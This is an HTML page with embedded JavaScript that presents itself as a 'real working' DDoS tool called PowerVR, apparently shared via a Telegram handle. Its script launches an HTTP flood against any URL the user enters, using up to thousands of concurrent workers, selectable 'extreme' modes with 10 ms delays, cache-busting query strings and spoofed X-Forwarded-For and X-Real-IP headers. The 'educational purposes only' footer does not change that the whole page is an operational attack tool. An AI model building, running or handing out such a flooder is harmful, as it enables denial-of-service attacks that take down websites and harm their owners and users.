<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üî• PowerVR DDoS - REAL WORKING ATTACK</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: #000; color: #ff0000; min-height: 100vh; overflow-x: hidden; }
        
        /* Matrix Rain */
        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
        
        /* Main Container */
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        
        /* Header */
        .header { text-align: center; padding: 30px 0; border-bottom: 3px solid #ff0000; margin-bottom: 30px; }
        .header h1 { font-size: 3.5rem; text-transform: uppercase; letter-spacing: 5px; text-shadow: 0 0 10px #ff0000; }
        .header .subtitle { color: #ff4444; letter-spacing: 3px; margin-top: 10px; }
        
        /* Control Panel */
        .panel { background: rgba(0, 0, 0, 0.8); border: 2px solid #ff0000; border-radius: 10px; padding: 25px; margin: 20px 0; }
        .panel-title { color: #ff0000; border-bottom: 1px solid #ff0000; padding-bottom: 10px; margin-bottom: 20px; font-size: 1.5rem; }
        
        /* Input Groups */
        .input-group { margin: 15px 0; }
        .input-group label { display: block; color: #ff6666; margin-bottom: 5px; font-size: 0.9rem; text-transform: uppercase; }
        .input-group input, .input-group select { width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.8); border: 1px solid #ff0000; border-radius: 5px; color: #ff0000; font-size: 1rem; }
        
        /* Attack Buttons */
        .buttons { display: flex; gap: 20px; margin: 30px 0; flex-wrap: wrap; }
        .btn { padding: 15px 40px; border: none; border-radius: 5px; font-size: 1.1rem; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: 0.3s; }
        .btn-attack { background: linear-gradient(45deg, #ff0000, #990000); color: white; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); }
        .btn-stop { background: #000; color: #ff0000; border: 2px solid #ff0000; }
        .btn:hover { transform: scale(1.05); }
        
        /* Stats */
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin: 25px 0; }
        .stat { background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.3); border-radius: 8px; padding: 15px; text-align: center; }
        .stat .value { font-size: 2rem; font-weight: bold; color: #ff0000; }
        .stat .label { color: #ff6666; font-size: 0.8rem; text-transform: uppercase; margin-top: 5px; }
        
        /* Log Console */
        .log { height: 200px; overflow-y: auto; background: #000; border: 1px solid #ff0000; border-radius: 5px; padding: 15px; font-family: monospace; font-size: 0.9rem; }
        .log-entry { padding: 5px 0; border-bottom: 1px solid rgba(255, 0, 0, 0.1); color: #ff4444; }
        .log-success { color: #00ff00; }
        .log-error { color: #ff0000; }
        
        /* Footer */
        .footer { text-align: center; padding: 20px; margin-top: 40px; border-top: 1px solid #ff0000; color: #ff6666; }
    </style>
</head>
<body>
    <!-- Matrix Rain -->
    <canvas id="matrix"></canvas>
    
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1>üî• POWERVR DDoS</h1>
            <div class="subtitle">REAL WORKING ATTACK - NO SIMULATION|telegram: @iamKforReal</div>
        </header>
        
        <!-- Control Panel -->
        <div class="panel">
            <div class="panel-title">‚ö° ATTACK CONTROL PANEL</div>
            
            <!-- Target Config -->
            <div class="input-group">
                <label>Target URL</label>
                <input type="text" id="targetUrl" placeholder="https://example.com" value="https://httpbin.org/get">
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                <div class="input-group">
                    <label>Threads</label>
                    <input type="number" id="threads" min="1" max="10000" value="100">
                </div>
                <div class="input-group">
                    <label>Requests per Thread</label>
                    <input type="number" id="requests" min="1" max="100000" value="1000">
                </div>
            </div>
            
            <div class="input-group">
                <label>Attack Mode</label>
                <select id="attackMode">
                    <option value="normal">NORMAL ATTACK</option>
                    <option value="intense">INTENSE ATTACK</option>
                    <option value="extreme">EXTREME ATTACK</option>
                </select>
            </div>
            
            <!-- Attack Buttons -->
            <div class="buttons">
                <button class="btn btn-attack" id="startBtn">
                    üöÄ LAUNCH REAL ATTACK
                </button>
                <button class="btn btn-stop" id="stopBtn">
                    ‚õî STOP ATTACK
                </button>
                <button class="btn" style="background:#333;color:#0f0;" id="testBtn">
                    üß™ TEST CONNECTION
                </button>
            </div>
            
            <!-- Statistics -->
            <div class="stats">
                <div class="stat">
                    <div class="value" id="totalRequests">0</div>
                    <div class="label">TOTAL REQUESTS</div>
                </div>
                <div class="stat">
                    <div class="value" id="successRate">0%</div>
                    <div class="label">SUCCESS RATE</div>
                </div>
                <div class="stat">
                    <div class="value" id="activeWorkers">0</div>
                    <div class="label">ACTIVE WORKERS</div>
                </div>
                <div class="stat">
                    <div class="value" id="timeElapsed">00:00</div>
                    <div class="label">TIME ELAPSED</div>
                </div>
            </div>
            
            <!-- Attack Log -->
            <div class="panel-title">üìú ATTACK LOG</div>
            <div class="log" id="attackLog">
                <div class="log-entry">[SYSTEM] PowerVR DDoS v2.0 Initialized</div>
                <div class="log-entry">[SYSTEM] Real attack engine ready</div>
                <div class="log-entry">[INFO] Enter target URL and click LAUNCH</div>
            </div>
        </div>
        
        <!-- Footer -->
        <footer class="footer">
            <p>‚ö†Ô∏è FOR EDUCATIONAL PURPOSES ONLY ‚ö†Ô∏è</p>
            <p>Use only on websites you own or have permission to test</p>
        </footer>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@!%^&*()";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillStyle = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);
        
        // Real DDoS Engine
        let attackRunning = false;
        let attackWorkers = [];
        let startTime;
        let stats = {
            totalRequests: 0,
            successful: 0,
            failed: 0
        };
        
        // DOM Elements
        const targetUrl = document.getElementById('targetUrl');
        const threads = document.getElementById('threads');
        const requests = document.getElementById('requests');
        const attackMode = document.getElementById('attackMode');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const testBtn = document.getElementById('testBtn');
        const totalRequestsEl = document.getElementById('totalRequests');
        const successRateEl = document.getElementById('successRate');
        const activeWorkersEl = document.getElementById('activeWorkers');
        const timeElapsedEl = document.getElementById('timeElapsed');
        const attackLog = document.getElementById('attackLog');
        
        // Add log
        function addLog(message, type = 'info') {
            const entry = document.createElement('div');
            entry.className = `log-entry log-${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            attackLog.appendChild(entry);
            attackLog.scrollTop = attackLog.scrollHeight;
        }
        
        // Generate random IP
        function randomIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }
        
        // REAL HTTP Flood Worker
        function createWorker(workerId, target, maxRequests) {
            return new Promise((resolve) => {
                let requestCount = 0;
                let successCount = 0;
                
                async function flood() {
                    if (!attackRunning || requestCount >= maxRequests) {
                        resolve({ workerId, requests: requestCount, success: successCount });
                        return;
                    }
                    
                    try {
                        // REAL HTTP Request dengan fetch API
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 5000);
                        
                        const response = await fetch(target + '?cache=' + Date.now() + '&worker=' + workerId, {
                            method: 'GET',
                            mode: 'no-cors', // Bypass CORS untuk beberapa request
                            headers: {
                                'User-Agent': `Mozilla/5.0 (Worker ${workerId})`,
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'Accept-Language': 'en-US,en;q=0.9',
                                'X-Forwarded-For': randomIP(),
                                'X-Real-IP': randomIP(),
                                'Referer': 'https://www.google.com/',
                                'Cache-Control': 'no-cache',
                                'Pragma': 'no-cache'
                            },
                            signal: controller.signal
                        });
                        
                        clearTimeout(timeoutId);
                        
                        requestCount++;
                        successCount++;
                        stats.totalRequests++;
                        stats.successful++;
                        
                        // Update UI
                        totalRequestsEl.textContent = stats.totalRequests.toLocaleString();
                        successRateEl.textContent = ((stats.successful / stats.totalRequests) * 100).toFixed(1) + '%';
                        
                    } catch (error) {
                        requestCount++;
                        stats.totalRequests++;
                        stats.failed++;
                        
                        totalRequestsEl.textContent = stats.totalRequests.toLocaleString();
                        successRateEl.textContent = ((stats.successful / stats.totalRequests) * 100).toFixed(1) + '%';
                    }
                    
                    // Request delay berdasarkan mode
                    let delay;
                    switch(attackMode.value) {
                        case 'extreme': delay = 10; break;
                        case 'intense': delay = 50; break;
                        default: delay = 100; break;
                    }
                    
                    setTimeout(flood, delay);
                }
                
                flood();
            });
        }
        
        // Start REAL Attack
        async function startAttack() {
            if (attackRunning) return;
            
            const target = targetUrl.value.trim();
            if (!target) {
                addLog('ERROR: Please enter target URL', 'error');
                return;
            }
            
            if (!target.startsWith('http')) {
                addLog('ERROR: URL must start with http:// or https://', 'error');
                return;
            }
            
            // Konfirmasi
            if (!confirm(`üöÄ LAUNCH REAL ATTACK?\n\nTarget: ${target}\nThreads: ${threads.value}\nRequests: ${requests.value}\nMode: ${attackMode.value}\n\nThis will send REAL HTTP requests!`)) {
                return;
            }
            
            attackRunning = true;
            startTime = Date.now();
            startBtn.disabled = true;
            
            // Reset stats
            stats = { totalRequests: 0, successful: 0, failed: 0 };
            totalRequestsEl.textContent = '0';
            successRateEl.textContent = '0%';
            
            addLog(`üöÄ REAL ATTACK LAUNCHED against ${target}`, 'success');
            addLog(`üßµ Starting ${threads.value} workers...`, 'info');
            addLog(`üì® ${requests.value} requests per worker`, 'info');
            addLog(`‚ö° Attack mode: ${attackMode.value.toUpperCase()}`, 'info');
            
            // Start workers
            const numWorkers = parseInt(threads.value);
            const maxRequests = parseInt(requests.value);
            
            attackWorkers = [];
            for (let i = 0; i < numWorkers; i++) {
                attackWorkers.push(createWorker(i, target, maxRequests));
            }
            
            // Update active workers
            activeWorkersEl.textContent = numWorkers;
            
            // Start timer
            const timerInterval = setInterval(() => {
                if (!attackRunning) {
                    clearInterval(timerInterval);
                    return;
                }
                
                const elapsed = Date.now() - startTime;
                const minutes = Math.floor(elapsed / 60000);
                const seconds = Math.floor((elapsed % 60000) / 1000);
                timeElapsedEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                // Log progress
                if (stats.totalRequests % 100 === 0 && stats.totalRequests > 0) {
                    addLog(`üìä Progress: ${stats.totalRequests} requests sent (${((stats.successful / stats.totalRequests) * 100).toFixed(1)}% success)`, 'info');
                }
            }, 1000);
            
            // Wait for all workers to complete
            Promise.all(attackWorkers).then(results => {
                attackRunning = false;
                startBtn.disabled = false;
                clearInterval(timerInterval);
                
                const totalSent = results.reduce((sum, r) => sum + r.requests, 0);
                const totalSuccess = results.reduce((sum, r) => sum + r.success, 0);
                
                addLog(`‚úÖ ATTACK COMPLETED`, 'success');
                addLog(`üìä Total requests: ${totalSent.toLocaleString()}`, 'info');
                addLog(`üéØ Success rate: ${((totalSuccess / totalSent) * 100).toFixed(1)}%`, 'info');
                addLog(`‚è±Ô∏è Duration: ${timeElapsedEl.textContent}`, 'info');
                
                activeWorkersEl.textContent = '0';
            }).catch(error => {
                addLog(`‚ùå Attack error: ${error.message}`, 'error');
                attackRunning = false;
                startBtn.disabled = false;
                activeWorkersEl.textContent = '0';
            });
        }
        
        // Stop Attack
        function stopAttack() {
            if (!attackRunning) return;
            
            if (confirm('‚õî STOP ATTACK?')) {
                attackRunning = false;
                startBtn.disabled = false;
                activeWorkersEl.textContent = '0';
                addLog('üõë ATTACK STOPPED BY USER', 'error');
            }
        }
        
        // Test Connection
        async function testConnection() {
            const target = targetUrl.value.trim();
            if (!target) {
                addLog('ERROR: Enter target URL first', 'error');
                return;
            }
            
            addLog(`üß™ Testing connection to ${target}...`, 'info');
            
            try {
                const start = Date.now();
                const response = await fetch(target, { 
                    method: 'HEAD',
                    mode: 'no-cors'
                });
                const latency = Date.now() - start;
                
                addLog(`‚úÖ Connection successful! Latency: ${latency}ms`, 'success');
                addLog(`üéØ Target is reachable and responding`, 'success');
            } catch (error) {
                addLog(`‚ùå Connection failed: ${error.message}`, 'error');
                addLog(`‚ö†Ô∏è Target may be down or blocking requests`, 'error');
            }
        }
        
        // Event Listeners
        startBtn.addEventListener('click', startAttack);
        stopBtn.addEventListener('click', stopAttack);
        testBtn.addEventListener('click', testConnection);
        
        // Keyboard Shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'Enter') startAttack();
            if (e.key === 'Escape') stopAttack();
            if (e.ctrlKey && e.key === 't') testConnection();
        });
        
        // Auto-focus target input
        targetUrl.focus();
        
        // Add sample log
        setTimeout(() => {
            addLog('[SYSTEM] Ready for REAL HTTP flood attack', 'success');
            addLog('[TIP] Use https://httpbin.org/get for testing', 'info');
            addLog('[TIP] Press Ctrl+Enter to launch attack', 'info');
        }, 1000);
        
        // Peringatan awal
        console.log(`
        ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
        ‚ïë             POWERVR DDoS v2.0                    ‚ïë
        ‚ïë         REAL WORKING ATTACK ENGINE               ‚ïë
        ‚ïë     This sends ACTUAL HTTP requests!             ‚ïë
        ‚ïë     Use responsibly and legally!                 ‚ïë
        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
        `);
    </script>
</body>
  </html>
